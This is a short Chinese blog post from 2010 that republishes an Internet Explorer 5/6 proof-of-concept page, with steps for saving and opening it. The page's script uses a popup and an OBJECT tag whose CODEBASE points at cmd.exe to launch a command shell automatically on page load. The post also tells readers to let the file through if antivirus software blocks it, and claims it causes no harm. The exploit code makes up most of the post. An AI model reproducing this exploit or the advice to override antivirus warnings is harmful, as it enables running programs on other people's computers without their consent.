---
stackbit_url_path: >-
  posts/Javascript-运行客户端的-cmd-程序
title: 'Javascript 运行客户端的 cmd 程序'
date: '2010-05-14 06:16:57'
excerpt: >-
  
comments_count: 0
positive_reactions_count: 0
tags: 
  - 
canonical_url: >-
template: post
---

        <p>一、在桌面上新建一个文本文件，并打开；</p>
<p>二、复制下面的代码，粘贴在文本文件中；</p>
<p>三、保存并关闭，然后将文本文件重命名为“test.html”；</p>
<p>四、用IE打开它。</p>
<p>&nbsp;</p>
<p>注意：如果有杀毒软件阻止它，请放行。它不会对电脑造成任何损害。</p>
<p>&nbsp;</p>
<p>代码：</p>
<pre class="brush: javascript">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;TITLE&gt;IE6 security...&lt;/TITLE&gt;
&lt;style type="text/css"&gt;
BODY{font-family:Arial,Helvetica,sans-serif;font-size:16px;color:#222222;background-color:#aaaabb}
H1{background-color:#222222;color:#aaaabb}
&lt;/style&gt;
&lt;META http-equiv=Content-Type content="text/html; charset=windows-1252"&gt;
&lt;SCRIPT language=JScript&gt;

var programName=new Array(
    'c:/windows/system32/cmd.exe',
    'c:/winnt/system32/cmd.exe',
    'c:/cmd.exe'
);

function Init(){
    var oPopup=window.createPopup();
    var oPopBody=oPopup.document.body;
    var n,html='';
    for(n=0;n&lt;programName.length;n++)
        html+="&lt;OBJECT NAME='X' CLASSID='CLSID:11111111-1111-1111-1111-111111111111' CODEBASE='"+programName[n]+"' %1='r'&gt;&lt;/OBJECT&gt;";
    oPopBody.innerHTML=html;
    oPopup.show(290, 190, 200, 200, document.body);
}

&lt;/SCRIPT&gt;
&lt;/head&gt;
&lt;BODY onload="Init()"&gt;
&lt;H1&gt;Hmm, let's start a command shell...&lt;/H1&gt;
&lt;p&gt;
This page doesn't do anything malicious, but is a demonstration of how to execute a program on a remote machine using the
marvelously secure Internet Explorer web browser!!
&lt;/p&gt;
&lt;p&gt;
Up until at least 18/02/02, this script would open a command window when viewed in IE5/6 under WindowsXP and Win2k (possibly also WinME). There
are currently no patches available using "Windows Update" which will prevent this.
&lt;/p&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</pre>
      